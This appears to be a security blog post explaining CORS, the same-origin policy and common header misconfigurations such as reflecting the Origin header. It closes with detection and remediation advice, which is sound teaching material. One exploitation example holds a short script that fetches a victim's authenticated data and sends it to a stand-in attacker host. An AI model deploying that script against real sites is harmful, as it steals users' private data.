---
layout: post
title:  "CORS Header Misconfiguration"
date:   2019-09-22 22:31:34 +0800
author: allencharp
tags: [web-security, cors, misconfiguration]
---

# What is CORS

A request for a resource (like an image or a font) from outside the origin is known as a cross-origin request. CORS (Cross-Origin Resource Sharing) is the mechanism that manages these cross-origin requests.

To understand CORS, we first need the **Same-Origin Policy (SOP)**: by default, a web page can only read responses from the same origin (scheme + host + port). The SOP is a fundamental security boundary of the browser — without it, any website could read the inbox of a user logged into any other site. CORS is the controlled *exception* to the SOP: it lets a server explicitly declare which origins are allowed to read its responses.

The CORS standard is needed because it allows servers to specify not just *who* can access its assets, but also *how* the assets can be accessed. For example, server A probably does not want servers B, C or D to edit or delete its assets.

# CORS Headers

The most important header is **Access-Control-Allow-Origin**, which is decided by the server and controls which origins can access the resource:

* Access-Control-Allow-Origin
* Access-Control-Allow-Credentials
* Access-Control-Allow-Headers
* Access-Control-Allow-Methods
* Access-Control-Expose-Headers
* Access-Control-Max-Age
* Access-Control-Request-Headers
* Access-Control-Request-Method
* Origin

## Simple requests vs preflight requests

* **Simple requests** (e.g. GET or POST with a limited set of headers) are sent directly; the browser only blocks *reading* the response if the `Access-Control-Allow-Origin` header is missing or disallows the origin.
* **Preflighted requests** (e.g. with `Content-Type: application/json`, custom headers, or methods like PUT/DELETE) first send an **OPTIONS** request carrying `Access-Control-Request-Method` and `Access-Control-Request-Headers`. The server must answer with the allowed methods/headers, otherwise the actual request is blocked by the browser.

## `*` vs `Access-Control-Allow-Credentials`

If the response includes `Access-Control-Allow-Credentials: true`, the `Access-Control-Allow-Origin` header **cannot be `*`** — browsers reject the combination. This is a common source of misconfiguration: developers set `*` for convenience and then wonder why credentialed requests fail, or worse, they reflect the `Origin` header to make it work.

# CORS Misconfiguration

* Setting `*` in the *Access-Control-Allow-Origin* header when the response contains sensitive information (any website can read the response)
* Poor validation of the *Origin* header (e.g. accepting any `example.com.evil.com` or `*example.com` suffix)
* Directly reflecting the *Origin* header into *Access-Control-Allow-Origin* without an allowlist

## Exploitation example

If the server reflects any `Origin` and allows credentials, an attacker can read authenticated data from a victim's browser:

```html
<script>
fetch('https://victim.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // exfiltrate the response to the attacker's server
    new Image().src = 'https://attacker.com/steal?data=' + JSON.stringify(data);
  });
</script>
```

When the victim visits the attacker's page, the browser sends the request with the victim's cookies, and — because the server reflects the origin — the attacker can read the response.

# Detection and Remediation

* Test with a malicious origin (`https://evil.com`) and inspect whether `Access-Control-Allow-Origin` reflects it.
* Use a strict allowlist of trusted origins in `Access-Control-Allow-Origin`; never reflect arbitrary origins, especially for authenticated endpoints.
* Avoid `Access-Control-Allow-Credentials: true` unless truly needed, and never combine it with `*`.
* Validate origins with exact string matching, not prefix/suffix matching.

# CORS Scan Tool

[CORScanner](https://github.com/chenjj/CORScanner)

# Summary

CORS misconfiguration is a high-impact, often overlooked issue: a single reflected `Origin` on an authenticated API can let any website read a user's private data. Always whitelist origins explicitly and test with both allowed and malicious origins.
